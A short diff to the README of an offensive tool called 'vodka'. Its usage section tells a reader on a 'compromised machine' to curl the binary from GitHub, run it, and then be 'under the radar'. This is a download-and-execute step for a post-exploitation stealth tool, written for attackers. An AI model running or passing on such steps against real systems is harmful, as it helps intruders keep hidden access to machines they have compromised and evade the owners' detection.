@@ -13,8 +13,12 @@ You need to get an interactive shell. (Find a way to spawned it, you are a hacke
 ```shell
 ## Download it from github release
 ## If you do not have internet access from compromised machine, find another way
-curl -lO -L https://github.com/ariary/vodka/releases/latest/download/vodka      
+curl -lO -L https://github.com/ariary/vodka/releases/latest/download/vodka
+
+## Execute it
 ./vodka
+
+## You are now under the radar
  vodka » [command]
 ```
 
